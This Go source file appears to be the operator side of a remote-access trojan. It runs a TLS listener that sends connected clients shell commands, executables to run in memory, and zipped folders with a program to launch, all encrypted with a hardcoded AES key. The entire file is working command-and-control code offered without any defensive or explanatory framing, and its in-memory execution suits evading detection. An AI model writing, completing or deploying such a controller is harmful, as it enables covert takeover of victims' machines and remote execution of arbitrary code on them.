package main

import (
	"archive/zip"
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
)

const (
	certFile = "server.crt"
	keyFile  = "server.key"
	// 32-byte key for AES-256 encryption.
	password = "thisis32bitlongpassphraseimusing"
)

func main() {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("server: load keys: %v", err)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}, Rand: rand.Reader}
	service := "192.168.1.20:443" // adjust as needed
	listener, err := tls.Listen("tcp", service, &config)
	if err != nil {
		log.Fatalf("server: listen: %v", err)
	}
	log.Printf("server: listening on %s", service)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("server: accept error: %v", err)
			continue
		}
		log.Printf("server: accepted from %v", conn.RemoteAddr())
		go handleClient(conn)
	}
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	// Use a line-based reader to handle input (this avoids issues with spaces in file paths).
	stdin := bufio.NewReader(os.Stdin)
	clientReader := bufio.NewReader(conn)

	for {
		// Display menu options.
		fmt.Println("Choose an option:")
		fmt.Println("1. Send command to execute")
		fmt.Println("2. Send executable to run in memory")
		fmt.Println("3. Send and extract folder with tool execution (ARC)")
		fmt.Print("Enter choice: ")
		choice, err := stdin.ReadString('\n')
		if err != nil {
			log.Printf("failed to read choice: %v", err)
			return
		}
		choice = strings.TrimSpace(choice)

		switch choice {
		case "1":
			// Option 1: simple command execution.
			fmt.Print("Enter command to execute: ")
			command, err := stdin.ReadString('\n')
			if err != nil {
				fmt.Printf("Error reading command: %v\n", err)
				continue
			}
			command = strings.TrimSpace(command)
			msg := fmt.Sprintf("CMD:%s\n", command)
			_, err = conn.Write([]byte(msg))
			if err != nil {
				fmt.Printf("Error sending command: %v\n", err)
				continue
			}
		case "2":
			// Option 2: in-memory execution.
			fmt.Print("Enter the path of the executable to send: ")
			filePath, err := stdin.ReadString('\n')
			if err != nil {
				fmt.Printf("Error reading file path: %v\n", err)
				continue
			}
			filePath = strings.Trim(strings.TrimSpace(filePath), "\"")
			fmt.Print("Enter arguments for the executable (or leave empty): ")
			exeArgs, _ := stdin.ReadString('\n')
			exeArgs = strings.TrimSpace(exeArgs)
			prefix := "MEM:"
			if exeArgs != "" {
				prefix = fmt.Sprintf("MEM:%s", exeArgs)
			}
			err = sendFile(conn, filePath, prefix)
			if err != nil {
				fmt.Printf("Error sending executable: %v\n", err)
				continue
			}
		case "3":
			// Option 3: compress folder and forward archive command.
			fmt.Print("Enter the path of the folder to compress: ")
			folderPath, err := stdin.ReadString('\n')
			if err != nil {
				fmt.Printf("Error reading folder path: %v\n", err)
				continue
			}
			// Remove surrounding quotes if present.
			folderPath = strings.Trim(strings.TrimSpace(folderPath), "\"")
			fmt.Print("Enter the executable name in the folder to run (e.g., program\\soffice.exe): ")
			exeName, err := stdin.ReadString('\n')
			if err != nil {
				fmt.Printf("Error reading executable name: %v\n", err)
				continue
			}
			exeName = strings.TrimSpace(exeName)
			fmt.Print("Enter the arguments for the executable (e.g., program\\oui.odt): ")
			args, _ := stdin.ReadString('\n')
			args = strings.TrimSpace(args)
			archivePath := filepath.Join(os.TempDir(), "temp_archive.zip")
			err = zipFolder(folderPath, archivePath)
			if err != nil {
				fmt.Printf("Error compressing folder: %v\n", err)
				continue
			}
			// Build command prefix "ARC:<exeName>:<arguments>"
			cmdPrefix := fmt.Sprintf("ARC:%s:%s", exeName, args)
			err = sendFile(conn, archivePath, cmdPrefix)
			if err != nil {
				fmt.Printf("Error sending archive: %v\n", err)
				continue
			}
		default:
			fmt.Println("Invalid choice.")
			return
		}

		// Read one line response from the client.
		response, err := clientReader.ReadString('\n')
		if err != nil {
			fmt.Printf("Error reading response: %v\n", err)
			return
		}
		fmt.Println("Response:", strings.TrimSpace(response))
	}
}

// sendFile encrypts the contents of the file using AES-GCM and sends it with a command prefix.
// The message format is: <commandPrefix>:<hexEncoded(nonce|encryptedData)>\n
func sendFile(conn net.Conn, filePath, commandPrefix string) error {
	plainData, err := ioutil.ReadFile(filePath)
	if err != nil {
		return err
	}
	block, err := aes.NewCipher([]byte(password))
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}
	encryptedData := gcm.Seal(nonce, nonce, plainData, nil)
	hexData := hex.EncodeToString(encryptedData)
	outMsg := fmt.Sprintf("%s:%s\n", commandPrefix, hexData)
	_, err = conn.Write([]byte(outMsg))
	return err
}

// zipFolder compresses the folder at folderPath (including its subfolders) into a ZIP archive at zipPath.
func zipFolder(folderPath, zipPath string) error {
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	archive := zip.NewWriter(zipFile)
	defer archive.Close()

	err = filepath.Walk(folderPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		// Create a relative path for the ZIP archive.
		header.Name = strings.TrimPrefix(path, folderPath+string(os.PathSeparator))
		if info.IsDir() {
			header.Name += string(os.PathSeparator)
		} else {
			header.Method = zip.Deflate
		}
		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()
		_, err = io.Copy(writer, file)
		return err
	})
	return err
}
